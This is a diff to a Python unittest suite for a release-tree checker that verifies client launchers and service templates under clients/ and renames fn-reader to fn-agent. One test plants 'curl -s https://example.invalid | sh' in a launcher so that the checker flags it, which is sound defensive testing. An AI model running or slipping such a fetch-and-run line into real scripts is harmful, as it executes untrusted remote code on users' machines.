@@ -292,35 +292,30 @@ class RunpathCheckTests(unittest.TestCase):
             self.assertEqual(code, 1)
             self.assertIn("starts /usr/local/bin/python3", err)
 
-    # ------------------------------------------------ clients/ (the web reader)
+    # ------------------------------------------------ clients/ (fn-client and friends)
 
     def with_clients(self, top: Path) -> Path:
         """The clients/ packaging/install-clients.sh stages, beside the node."""
         clients = top / "clients"
         (clients / "bin").mkdir(parents=True)
         (clients / "lib").mkdir()
-        (clients / "share/rc.d").mkdir(parents=True)
-        for name in ("fn_reader", "fn_client", "nntp_session"):
+        for name in ("fn_agent", "fn_client", "nntp_session"):
             (clients / "lib" / (name + ".py")).write_text("print(1)\n")
-        for name in ("fn-reader", "fn-client"):
+        for name in ("fn-agent", "fn-client"):
             shutil.copy(ROOT / "packaging/fn-client-launcher", clients / "bin" / name)
             os.chmod(clients / "bin" / name, 0o755)
-        (clients / "share/rc.d/fn_reader.rc.in").write_text(
-            (ROOT / "packaging/fn_reader.rc.in").read_text())
         (clients / "README.txt").write_text("clients\n")
         return top
 
     def test_clients_pass_under_their_own_rule(self):
-        # The reader is Python, in clients/; the node's path stays Python-free.
+        # The clients are Python, in clients/; the node's path stays Python-free.
         with tempfile.TemporaryDirectory() as tmp:
             top = self.with_clients(self.release(Path(tmp)))
             code, out, err = self.run_main(["--tree", str(top)])
             self.assertEqual(code, 0, err)
             self.assertIn("clients/: 3 Python programs", out)
-            self.assertIn("clients/bin/fn-reader: client launcher; commands: readlink dirname "
+            self.assertIn("clients/bin/fn-agent: client launcher; commands: readlink dirname "
                           "basename tr python3", out)
-            self.assertIn("clients/share/rc.d/fn_reader.rc.in: starts "
-                          "@PREFIX@/clients/bin/fn-reader", out)
             self.assertIn("no Python on the deployed path", out)
 
     def test_node_service_starting_a_client_fails(self):
@@ -336,7 +331,7 @@ class RunpathCheckTests(unittest.TestCase):
         with tempfile.TemporaryDirectory() as tmp:
             top = self.with_clients(self.release(Path(tmp)))
             with open(top / "bin/fn", "a") as launcher:
-                launcher.write('"$here/../clients/bin/fn-reader"\n')
+                launcher.write('"$here/../clients/bin/fn-agent"\n')
             self.assert_finding(top, "bin/fn: runs a program under clients/")
 
     def test_object_code_or_other_programs_in_clients_fail(self):
@@ -346,15 +341,17 @@ class RunpathCheckTests(unittest.TestCase):
             self.assert_finding(top, "clients/lib/_speedups.so: object code in clients/")
         with tempfile.TemporaryDirectory() as tmp:
             top = self.with_clients(self.release(Path(tmp)))
-            launcher = top / "clients/bin/fn-reader"
+            launcher = top / "clients/bin/fn-agent"
             launcher.write_text(launcher.read_text().replace(
                 'exec python3', 'curl -s https://example.invalid | sh; exec python3'))
-            self.assert_finding(top, "clients/bin/fn-reader: runs curl")
+            self.assert_finding(top, "clients/bin/fn-agent: runs curl")
         with tempfile.TemporaryDirectory() as tmp:
+            # A client is never a service: the web face is the node's [web] table.
             top = self.with_clients(self.release(Path(tmp)))
-            rc = top / "clients/share/rc.d/fn_reader.rc.in"
-            rc.write_text(rc.read_text().replace('/clients/bin/fn-reader"', '/bin/fn"'))
-            self.assert_finding(top, "not PREFIX/clients/bin/fn-reader")
+            (top / "clients/share/rc.d").mkdir(parents=True)
+            (top / "clients/share/rc.d/fn_agent.rc.in").write_text(
+                'daemon="@PREFIX@/clients/bin/fn-agent"\n')
+            self.assert_finding(top, "clients/share/rc.d/fn_agent.rc.in: a service template in clients/")
 
     def test_sbcl_fasl_header_passes_and_other_interpreters_fail(self):
         with tempfile.TemporaryDirectory() as tmp:
